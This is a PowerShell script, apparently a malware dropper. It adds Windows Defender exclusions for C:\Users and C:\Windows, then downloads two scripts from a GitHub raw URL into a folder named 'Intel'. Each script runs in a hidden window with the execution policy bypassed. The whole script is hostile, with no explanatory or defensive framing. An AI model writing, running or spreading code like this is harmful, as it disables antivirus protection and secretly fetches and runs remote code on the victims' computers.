Add-MpPreference -ExclusionPath "C:\Users"
Add-MpPreference -ExclusionPath "C:\Windows"

cd "$env:UserProfile\Intel" 

Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Alinsmekeru/Intel/main/tas.ps1' -O "$env:UserProfile\Intel\tas.ps1"

cmd /c PowerShell -NoProfile -ExecutionPolicy Bypass -Command "& {Start-Process PowerShell -ArgumentList '-W Hidden -NoProfile -ExecutionPolicy Bypass -File ""$env:UserProfile\Intel\tas.ps1""'}"

timeout /t 4 /nobreak

Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Alinsmekeru/Intel/main/vn.ps1' -O vn.ps1

cmd /c PowerShell -NoProfile -ExecutionPolicy Bypass -Command "& {Start-Process PowerShell -ArgumentList '-W Hidden -NoProfile -ExecutionPolicy Bypass -File ""$env:UserProfile\Intel\vn.ps1""'}"

